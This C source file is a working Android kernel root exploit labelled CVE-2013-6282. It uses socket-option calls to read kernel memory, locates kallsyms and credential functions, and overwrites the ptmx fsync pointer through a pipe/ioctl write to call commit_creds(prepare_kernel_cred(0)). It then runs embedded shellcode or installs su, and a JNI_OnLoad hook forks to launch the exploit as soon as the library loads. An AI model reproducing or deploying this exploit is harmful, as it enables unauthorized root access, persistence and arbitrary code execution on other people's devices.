#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <jni.h>
#include <dirent.h>
#include <android/log.h>


char __aeabi_unwind_cpp_pr0[0];

#define LOG_TAG "cve20136282"
#define LOGV(...) { __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }



unsigned char shellcode_buf[2048] = { 0x90, 0x90, 0x90, 0x90 };

#define KERNEL_START_ADDRESS 0xc0008000
#define KERNEL_SIZE 0x2000000
#define SEARCH_START_ADDRESS 0xc0800000
#define KALLSYMS_SIZE 0x200000
#define PTMX_DEVICE "/dev/ptmx"

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); fflush(stdout)
#endif

unsigned long prepare_kernel_cred_address = 0;
unsigned long commit_creds_address = 0;
unsigned long ptmx_fops_address = 0;
unsigned long ptmx_open_address = 0;
unsigned long tty_init_dev_address = 0;
unsigned long tty_release_address = 0;
unsigned long tty_fasync_address = 0;
unsigned long ptm_driver_address = 0;

unsigned long pattern_kallsyms_addresses[] = {
	0xc0008000,	/* stext */
	0xc0008000,	/* _sinittext */
	0xc0008000,	/* _stext */
	0xc0008000	/* __init_begin */
};
unsigned long pattern_kallsyms_addresses2[] = {
	0xc0008000,	/* stext */
	0xc0008000	/* _text */
};
unsigned long pattern_kallsyms_addresses3[] = {
	0xc00081c0,	/* asm_do_IRQ */
	0xc00081c0,	/* _stext */
	0xc00081c0	/* __exception_text_start */
};
unsigned long pattern_kallsyms_addresses4[] = {
	0xc0008180,
	0xc0008180,
	0xc0008180
};

unsigned long *kallsymsmem = NULL;
unsigned long kallsyms_num_syms;
unsigned long *kallsyms_addresses;
unsigned char *kallsyms_names;
unsigned char *kallsyms_token_table;
unsigned short *kallsyms_token_index;
unsigned long *kallsyms_markers;

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *);
int (*commit_creds)(struct cred *);

bool bChiled;

int read_value_at_address(unsigned long address, unsigned long *value) {
	int sock;
	int ret;
	int i;
	unsigned long addr = address;
	unsigned char *pval = (unsigned char *)value;
	socklen_t optlen = 1;

	*value = 0;
	errno = 0;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock < 0) {
		LOGV("socket() failed: %s.\n", strerror(errno));
		return -1;
	}

	for (i = 0; i < sizeof(*value); i++, addr++, pval++) {
		errno = 0;
		ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)addr, 1);
		if (ret != 0) {
			if (errno != EINVAL) {
				LOGV("setsockopt() failed: %s.\n", strerror(errno));
				close(sock);
				*value = 0;
				return -1;
			}
		}
		errno = 0;
		ret = getsockopt(sock, SOL_IP, IP_TTL, pval, &optlen);
		if (ret != 0) {
			LOGV("getsockopt() failed: %s.\n", strerror(errno));
			close(sock);
			*value = 0;
			return -1;
		}
	}

	close(sock);

	return 0;
}

unsigned long *kerneldump(unsigned long startaddr, unsigned long dumpsize) {
	unsigned long addr;
	unsigned long val;
	unsigned long *allocaddr;
	unsigned long *memaddr;

	LOGV("dumping kernel...\n");
	allocaddr = (unsigned long *)malloc(dumpsize);
	if (allocaddr == NULL) {
		LOGV("malloc failed: %s.\n", strerror(errno));
		return NULL;
	}
	memaddr = allocaddr;

	for (addr = startaddr; addr < (startaddr + dumpsize); addr += 4, memaddr++) {
		if (read_value_at_address(addr, &val) != 0) {
			LOGV("kerneldump failed: %s.\n", strerror(errno));
			return NULL;
		}
		*memaddr = val;
	}

	return allocaddr;
}

int check_pattern(unsigned long *addr, unsigned long firstval, unsigned long *pattern, int patternnum) {
	unsigned long val;
	unsigned long cnt;
	unsigned long i;

	if (firstval == pattern[0]) {
		cnt = 1;
		for (i = 1; i < patternnum; i++) {
			read_value_at_address((unsigned long)(&addr[i]), &val);
			if (val == pattern[i]) {
				cnt++;
			} else {
				break;
			}
		}
		if (cnt == patternnum) {
			return 0;
		}
	}

	return -1;
}

int check_kallsyms_header(unsigned long *addr) {
	unsigned long val;
	read_value_at_address((unsigned long)addr, &val);

	if (check_pattern(addr, val, pattern_kallsyms_addresses, sizeof(pattern_kallsyms_addresses) / 4) == 0) {
		return 0;
	} else if (check_pattern(addr, val, pattern_kallsyms_addresses2, sizeof(pattern_kallsyms_addresses2) / 4) == 0) {
		return 0;
	} else if (check_pattern(addr, val, pattern_kallsyms_addresses3, sizeof(pattern_kallsyms_addresses3) / 4) == 0) {
		return 0;
	} else if (check_pattern(addr, val, pattern_kallsyms_addresses4, sizeof(pattern_kallsyms_addresses4) / 4) == 0) {
		return 0;
	}

	return -1;
}

int get_kallsyms_addresses() {
	unsigned long *endaddr;
	unsigned long i, j;
	unsigned long *addr;
	unsigned long n;
	unsigned long val;
	unsigned long off;

	if (read_value_at_address(KERNEL_START_ADDRESS, &val) != 0) {
		LOGV("this device is not supported.\n");
		return -1;
	}
	LOGV("search kallsyms...\n");
	endaddr = (unsigned long *)(KERNEL_START_ADDRESS + KERNEL_SIZE);
	for (i = 0; i < (KERNEL_START_ADDRESS + KERNEL_SIZE - SEARCH_START_ADDRESS); i += 16) {
		for (j = 0; j < 2; j++) {
			/* get kallsyms_addresses pointer */
			if (j == 0) {
				kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS + i);
			} else {
				if ((i == 0) || ((SEARCH_START_ADDRESS - i) < KERNEL_START_ADDRESS)) {
					continue;
				}
				kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS - i);
			}
			if (check_kallsyms_header(kallsyms_addresses) != 0) {
				continue;
			}
			addr = kallsyms_addresses;
			off = 0;

			/* search end of kallsyms_addresses */
			n = 0;
			while (1) {
				read_value_at_address((unsigned long)addr, &val);
				if (val < KERNEL_START_ADDRESS) {
					break;
				}
				n++;
				addr++;
				off++;
				if (addr >= endaddr) {
					return -1;
				}
			}

			/* skip there is filled by 0x0 */
			while (1) {
				read_value_at_address((unsigned long)addr, &val);
				if (val != 0) {
					break;
				}
				addr++;
				off++;
				if (addr >= endaddr) {
					return -1;
				}
			}

			read_value_at_address((unsigned long)addr, &val);
			kallsyms_num_syms = val;
			addr++;
			off++;
			if (addr >= endaddr) {
				return -1;
			}

			/* check kallsyms_num_syms */
			if (kallsyms_num_syms != n) {
				continue;
			}

			LOGV("kallsyms_addresses=%08lx\n", (unsigned long)kallsyms_addresses);
			LOGV("kallsyms_num_syms=%08lx\n", kallsyms_num_syms);
			kallsymsmem = kerneldump((unsigned long)kallsyms_addresses, KALLSYMS_SIZE);
			if (kallsymsmem == NULL) {
				return -1;
			}
			kallsyms_addresses = kallsymsmem;
			endaddr = (unsigned long *)((unsigned long)kallsymsmem + KALLSYMS_SIZE);

			addr = &kallsymsmem[off];

			/* skip there is filled by 0x0 */
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= endaddr) {
					return -1;
				}
			}

			kallsyms_names = (unsigned char *)addr;

			/* search end of kallsyms_names */
			for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
				int len = kallsyms_names[off];
				off += len + 1;
				if (&kallsyms_names[off] >= (unsigned char *)endaddr) {
					return -1;
				}
			}

			/* adjust */
			addr = (unsigned long *)((((unsigned long)&kallsyms_names[off] - 1) | 0x3) + 1);
			if (addr >= endaddr) {
				return -1;
			}

			/* skip there is filled by 0x0 */
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= endaddr) {
					return -1;
				}
			}
			/* but kallsyms_markers shoud be start 0x00000000 */
			addr--;

			kallsyms_markers = addr;

			/* end of kallsyms_markers */
			addr = &kallsyms_markers[((kallsyms_num_syms - 1) >> 8) + 1];
			if (addr >= endaddr) {
				return -1;
			}

			/* skip there is filled by 0x0 */
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= endaddr) {
					return -1;
				}
			}

			kallsyms_token_table = (unsigned char *)addr;

			i = 0;
			while ((kallsyms_token_table[i] != 0x00) || (kallsyms_token_table[i + 1] != 0x00)) {
				i++;
				if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
					return -1;
				}
			}

			/* skip there is filled by 0x0 */
			while (kallsyms_token_table[i] == 0x00) {
				i++;
				if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
					return -1;
				}
			}

			/* but kallsyms_markers shoud be start 0x0000 */
			kallsyms_token_index = (unsigned short *)&kallsyms_token_table[i - 2];

			return 0;
		}
	}
	return -1;
}

unsigned long kallsyms_expand_symbol(unsigned long off, char *namebuf) {
	int len;
	int skipped_first;
	unsigned char *tptr;
	unsigned char *data;

	/* Get the compressed symbol length from the first symbol byte. */
	data = &kallsyms_names[off];
	len = *data;
	off += len + 1;
	data++;

	skipped_first = 0;
	while (len > 0) {
		tptr = &kallsyms_token_table[kallsyms_token_index[*data]];
		data++;
		len--;

		while (*tptr > 0) {
			if (skipped_first != 0) {
				*namebuf = *tptr;
				namebuf++;
			} else {
				skipped_first = 1;
			}
			tptr++;
		}
	}
	*namebuf = '\0';

	return off;
}

int search_functions() {
	char namebuf[1024];
	unsigned long i;
	unsigned long off;
	int cnt;

	cnt = 0;
	for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
		off = kallsyms_expand_symbol(off, namebuf);
		if (strcmp(namebuf, "prepare_kernel_cred") == 0) {
			prepare_kernel_cred_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "commit_creds") == 0) {
			commit_creds_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "ptmx_open") == 0) {
			ptmx_open_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "tty_init_dev") == 0) {
			tty_init_dev_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "tty_release") == 0) {
			tty_release_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "tty_fasync") == 0) {
			tty_fasync_address = kallsyms_addresses[i];
			cnt++;
		} else if (strcmp(namebuf, "ptmx_fops") == 0) {
			ptmx_fops_address = kallsyms_addresses[i];
		}
	}

	if (cnt < 6) {
		return -1;
	}

	return 0;
}

void analyze_ptmx_open() {
	unsigned long i, j, k;
	unsigned long addr;
	unsigned long val;
	unsigned long regnum;
	unsigned long data_addr;

	LOGV("analyze ptmx_open...\n");
	for (i = 0; i < 0x200; i += 4) {
		addr = ptmx_open_address + i;
		read_value_at_address(addr, &val);
		if ((val & 0xff000000) == 0xeb000000) {
			if ((((tty_init_dev_address / 4) - (addr / 4 + 2)) & 0x00ffffff) == (val & 0x00ffffff)) {
				for (j = 1; j <= i; j++) {
					addr = ptmx_open_address + i - j;
					read_value_at_address(addr, &val);
					if ((val & 0xfff0f000) == 0xe5900000) {
						regnum = (val & 0x000f0000) >> 16;
						for (k = 1; k <= (i - j); k++) {
							addr = ptmx_open_address + i - j - k;
							read_value_at_address(addr, &val);
							if ((val & 0xfffff000) == (0xe59f0000 + (regnum << 12))) {
								data_addr = addr + (val & 0x00000fff) + 8;
								read_value_at_address(data_addr, &val);
								ptm_driver_address = val;
								return;
							}
						}
					}
				}
			}
		}
	}

	return;
}

unsigned long search_ptmx_fops_address() {
	unsigned long *addr;
	unsigned long range;
	unsigned long *ptmx_fops_open;
	unsigned long i;
	unsigned long val, val2, val5;

	LOGV("search ptmx_fops...\n");
	if (ptm_driver_address != 0) {
		addr = (unsigned long *)ptm_driver_address;
	} else {
		addr = (unsigned long *)(kallsyms_addresses[kallsyms_num_syms - 1]);
	}
	addr++;
	ptmx_fops_open = NULL;
	range = ((KERNEL_START_ADDRESS + KERNEL_SIZE) - (unsigned long)addr) / sizeof(unsigned long);
	for (i = 0; i < range - 14; i++) {
		read_value_at_address((unsigned long)(&addr[i]), &val);
		if (val == ptmx_open_address) {
			read_value_at_address((unsigned long)(&addr[i + 2]), &val2);
			if (val2 == tty_release_address) {
				read_value_at_address((unsigned long)(&addr[i + 5]), &val5);
				if (val5 == tty_fasync_address) {
					ptmx_fops_open = &addr[i];
					break;
				}
			}
		}
	}

	if (ptmx_fops_open == NULL) {
		return 0;
	}
	return ((unsigned long)ptmx_fops_open - 0x2c);
}

int get_addresses() {
	prepare_kernel_cred_address = 0;
	commit_creds_address = 0;
	ptmx_fops_address = 0;
	ptmx_open_address = 0;
	tty_init_dev_address = 0;
	tty_release_address = 0;
	tty_fasync_address = 0;
	ptm_driver_address = 0;

	if (get_kallsyms_addresses() != 0) {
		if (kallsymsmem != NULL) {
			free(kallsymsmem);
			kallsymsmem = NULL;
		}
		LOGV("kallsyms_addresses search failed.\n");
		return -1;
	}

	if (search_functions() != 0) {
		if (kallsymsmem != NULL) {
			free(kallsymsmem);
			kallsymsmem = NULL;
		}
		LOGV("search_functions failed.\n");
		return -1;
	}

	if (ptmx_fops_address == 0) {
		analyze_ptmx_open();
		ptmx_fops_address = search_ptmx_fops_address();
		if (ptmx_fops_address == 0) {
			if (kallsymsmem != NULL) {
				free(kallsymsmem);
				kallsymsmem = NULL;
			}
			LOGV("search_ptmx_fops_address failed.\n");
			return -1;
		}
	}

	if (kallsymsmem != NULL) {
		free(kallsymsmem);
		kallsymsmem = NULL;
	}

	LOGV("\n");
	LOGV("prepare_kernel_cred=%08lx\n", prepare_kernel_cred_address);
	LOGV("commit_creds=%08lx\n", commit_creds_address);
	LOGV("ptmx_fops=%08lx\n", ptmx_fops_address);
	LOGV("ptmx_open=%08lx\n", ptmx_open_address);
	LOGV("tty_init_dev=%08lx\n", tty_init_dev_address);
	LOGV("tty_release=%08lx\n", tty_release_address);
	LOGV("tty_fasync=%08lx\n", tty_fasync_address);
	LOGV("ptm_driver=%08lx\n", ptm_driver_address);
	LOGV("\n");

	return 0;
}

void obtain_root_privilege(void) {
	commit_creds(prepare_kernel_cred(0));
}

static bool run_obtain_root_privilege(void *user_data) {
	int fd;

	fd = open(PTMX_DEVICE, O_WRONLY);
	fsync(fd);
	close(fd);

	return true;
}

/*
void ptrace_write_value_at_address(unsigned long int address, void *value) {
	pid_t pid;
	long ret;
	int status;

	bChiled = false;
	pid = fork();
	if (pid < 0) {
		return;
	}
	if (pid == 0) {
		ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
		if (ret < 0) {
			LOGV("PTRACE_TRACEME failed\n");
		}
		bChiled = true;
		signal(SIGSTOP, SIG_IGN);
		kill(getpid(), SIGSTOP);
		return;
	}

	do {
		ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
	} while (!bChiled);

	ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &value, (void *)address);
	if (ret < 0) {
		LOGV("PTRACE_PEEKDATA failed: %s\n", strerror(errno));
	}

	kill(pid, SIGKILL);
	waitpid(pid, &status, WNOHANG);
}
*/

int pipe_write_value_at_address(unsigned long address, void* value)
{
    char data[4];
    int pipefd[2];
    int i;

    *(long *)&data = (long)value;

    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }

    for (i = 0; i < (int) sizeof(data) ; i++) {
        char buf[256];
        buf[0] = 0;
        if (data[i]) {
            if (write(pipefd[1], buf, data[i]) != data[i]) {
                LOGV("error in write().\n");
                break;
            }
        }

        if (ioctl(pipefd[0], FIONREAD, (void *)(address + i)) == -1) {
            perror("ioctl");
            break;
        }

        if (data[i]) {
            if (read(pipefd[0], buf, sizeof buf) != data[i]) {
                LOGV("error in read().\n");
                break;
            }
        }
    }

    close(pipefd[0]);
    close(pipefd[1]);

    return (i == sizeof (data));
}

bool overwrite_ptmx_fsync_address(unsigned long int address, void *value, bool (*exploit_callback)(void *user_data), void *user_data) {
	bool success;

	/*ptrace_write_value_at_address(address, value);*/
	pipe_write_value_at_address(address, value);
	success = exploit_callback(user_data);

	return success;
}

static bool run_exploit(void) {
	unsigned long int ptmx_fops_fsync_address;

	prepare_kernel_cred = (void *)prepare_kernel_cred_address;
	commit_creds = (void *)commit_creds_address;

	ptmx_fops_fsync_address = ptmx_fops_address + 0x38;
	return overwrite_ptmx_fsync_address(ptmx_fops_fsync_address, &obtain_root_privilege, run_obtain_root_privilege, NULL);
}






void init_exploit() {

	if (get_addresses() != 0) {
		LOGV("Failed to get addresses.\n");
		return;
	}

	run_exploit();

	int uid = getuid();
	if (uid != 0) {
		LOGV("Failed to get root.\n");
		return;
	}

	if (shellcode_buf[0] == 0x90) {
		LOGV("No shellcode, uid=%d\n", uid);

		//moveAppIntoSystem();
		//system("/system/bin/sh -i");
		makeSUIntoSystem();
		exit(0);

		return;
	}
	LOGV("running shellcode, uid=%d\n", uid);

	void *ptr = mmap(0, sizeof(shellcode_buf), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (ptr == MAP_FAILED) {
		return;
	}
	memcpy(ptr, shellcode_buf, sizeof(shellcode_buf));
	void (*shellcode)() = (void(*)())ptr;
	shellcode();

	//moveAppIntoSystem();
	LOGV("exiting.\n");
}

int main(int argc, char **argv) {

	init_exploit();

	exit(EXIT_SUCCESS);
}

JNIEXPORT jint JNICALL JNI_OnLoad( JavaVM *vm, void *pvt )
{
	JNIEnv *env;
	LOGV("onload, uid=%d\n", getuid());

	if((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4) != JNI_OK)
	{
		return -1;
	}

	int pid = fork();
	if (pid == 0) {
		init_exploit();
	}
	return JNI_VERSION_1_4;
}

JNIEXPORT void JNICALL JNI_OnUnload( JavaVM *vm, void *pvt )
{
}
